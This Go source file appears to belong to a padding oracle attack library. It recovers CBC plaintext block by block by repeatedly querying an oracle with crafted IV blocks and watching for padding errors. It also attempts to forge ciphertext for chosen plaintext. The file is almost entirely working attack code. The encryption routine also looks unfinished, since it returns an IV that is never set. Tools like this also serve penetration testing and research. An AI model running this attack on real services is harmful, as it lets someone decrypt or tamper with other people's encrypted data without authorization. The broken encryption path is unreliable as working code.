package libpadoracle

import (
	"encoding/hex"
	"fmt"
	"sync"

	"github.com/gosuri/uiprogress"
)

func GetRangeDataSafe() []int {
	rangeData := []int{}
	for i := 3; i < 256; i++ {
		rangeData = append(rangeData, i)
	}
	rangeData = append(rangeData, []int{0, 2, 1}...)
	return rangeData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil { // IV was supplied by the user - let's prepend to the Decoded Ciphertext
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	// fmt.Println(Blocks)
	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}

	wg2.Wait()
}

// PerBlockOperations performs the actual math on each byte of the CipherText
func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	// TODO stuff here
	defer func() {
		wg.Done()
	}()
	var strData string
	var outData string
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = ' '
	bar.PrependFunc(func(b *uiprogress.Bar) string {
		return strData
	})
	bar.AppendFunc(func(b *uiprogress.Bar) string {
		return outData
	})
	rangeData := GetRangeDataSafe()
	blockDecipherChan := make(chan byte, 1)
	returnData := Data{}
	decipheredBlockBytes := []byte{}
	wg2 := sync.WaitGroup{}
	for byteNum, _ := range blockData { // Iterate over each byte
		continueChan := make(chan bool, 1)

		wg2.Add(1)
		// var found bool
		// Iterate through each possible byte value until padding error goes away
		for _, i := range rangeData {
			var found bool = false
			strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), y.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
			threadCh <- struct{}{}
			if blockNum == cfg.NumBlocks-1 && byteNum == 0 { // Edge case for the VERY LAST byte of ciphertext;
				// 	// this one will ALWAYS allow 0x01 to be valid (as 1 byte of padding in the final block is always a valid value)
				// 	// Additionally, there's a 1/256 chance that 0x02 will be valid
				// 	// The probability of each successive value is exponential, so we can probably assume it's not likely
				found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
			} else {
				go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
			}
			if found {
				break
			}
		}
		nextByte := <-blockDecipherChan
		strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), r.Sprintf("%02x", nextByte), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))

		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		bar.Incr()
		wg2.Wait()
	}
	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 { // Last block - unpad before saving cleartext
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	outData = fmt.Sprintf("Decrypted [%v]\n╰> Original Ciphertext:\t[%v]\n╰> Decrypted (Hex):\t[%v]\n╰> Cleartext:\t\t[%v]\n", r.Sprintf("Block %d", returnData.BlockNumber), b.Sprintf(hex.EncodeToString(returnData.EncryptedBlockData)), g.Sprintf(hex.EncodeToString(returnData.DecipheredBlockData)), gb.Sprintf(returnData.UnpaddedCleartext))

	decipherChan <- returnData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	select {
	case <-continueChan:
		return false
	default:
		var RawOracleData []byte
		// Math here - all the XORing and building of weird padding happens in these routines
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
		tmp := XORBytes(searchBlock, IV)
		oracleIvBlock := XORBytes(tmp, padBlock)

		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
		cfg.MetricsChan <- 1
		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably decrypted it!
			defer wg.Done()
			continueChan <- true
			close(continueChan)
			blockDecipherChan <- byte(bruteForceByteValue)
			if byteNum == cfg.BlockSize {
				close(blockDecipherChan)
			}
			return true
		}
		return false // This is to aid with detection of the final ciphertext's pad byte
	}
}

func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
	defer func() {
		wg.Done()
	}()

	// IV was supplied by the user - let's prepend to the Plaintext
	if cfg.IV != nil {
		plainText = append(cfg.IV, plainText...)
	}
	// So at this point plaintext should look like:
	// [Block0: IV][Block1 - Block n-1: Target Plaintext to be "encrypted"]

	// Chunk up the PKCS7-padded plaintext into BS-sized blocks
	plainTextChunks := ChunkBytes(Pad(plainText, cfg.BlockSize), cfg.BlockSize)

	// New slice to store our resulting ciphertext in; it needs space for the iv and final ciphertext block
	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)

	// We need a 'random' last block. It doesn't actually have to be random so I've filled it with A's
	cipherTextChunks[len(cipherTextChunks)-1] = GenerateFullSlice(0x41, cfg.BlockSize)
	// Reverse the order of the search
	for i := len(plainTextChunks) - 1; i >= 0; i-- {
		// Grab the next ciphertext and target plaintext blocks from the array
		ct := cipherTextChunks[i+1]
		nextCt := PerBlockOperationsEncrypt(*cfg, i, ct, plainTextChunks[i])
		// prepend the next ciphertext chunk to the list for processing
		cipherTextChunks[i] = nextCt
	}
}

// Encrypting works a little differently, and is dependent on the previous block being calculated, unlike decrypting :(. Paralleling this operation is likely not possible?
func PerBlockOperationsEncrypt(cfg Config, blockNum int, cipherText []byte, plaintText []byte) (iv []byte) {
	// threadCh := make(chan struct{}, cfg.Threads)
	rangeData := GetRangeDataSafe()
	decipheredBlockBytes := []byte{}
	var RawOracleData []byte

	for byteNum, _ := range plaintText { // Iterate over each byte
		for _, i := range rangeData {
			padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)                   // gives us [0x00,...,0x01] -> [0x10, ..., 0x10]
			searchBlock := BuildSearchBlock(decipheredBlockBytes, i, cfg.BlockSize) // gives us the modified IV block, mutating the last byte backwards
			nextPadBlock := BuildPaddingBlock(byteNum+1, cfg.BlockSize)             // gives us [0x00,...,0x01] -> [0x10, ..., 0x10]
			if byteNum > cfg.BlockSize {
				nextPadBlock[byteNum] = 0x00
			}
			RawOracleData = BuildRawOraclePayload(searchBlock, cipherText)
			// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
			encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
			// cfg.MetricsChan <- 1
			if !cfg.Pad.CallOracle(encodedPayload) {
				continue
			}
			decipheredBlockBytes = append([]byte{byte(i)}, decipheredBlockBytes...) // prepend the found byte
			// tmp := XORBytes(searchBlock, cipherText)
			// oracleIvBlock := XORBytes(tmp, padBlock)
			tmp := XORBytes(decipheredBlockBytes, padBlock[byteNum:])
			decipheredBlockBytes = XORBytes(tmp, nextPadBlock[byteNum:])
		}

	}
	return iv
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperationsEncrypt(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	select {
	case <-continueChan:
		return false
	default:
		var RawOracleData []byte
		// Math here - all the XORing and building of weird padding happens in these routines
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
		tmp := XORBytes(searchBlock, IV)
		oracleIvBlock := XORBytes(tmp, padBlock)

		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
		cfg.MetricsChan <- 1
		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably decrypted it!
			defer wg.Done()
			continueChan <- true
			close(continueChan)
			blockDecipherChan <- byte(bruteForceByteValue)
			if byteNum == cfg.BlockSize {
				close(blockDecipherChan)
			}
			return true
		}
		return false // This is to aid with detection of the final ciphertext's pad byte
	}
}
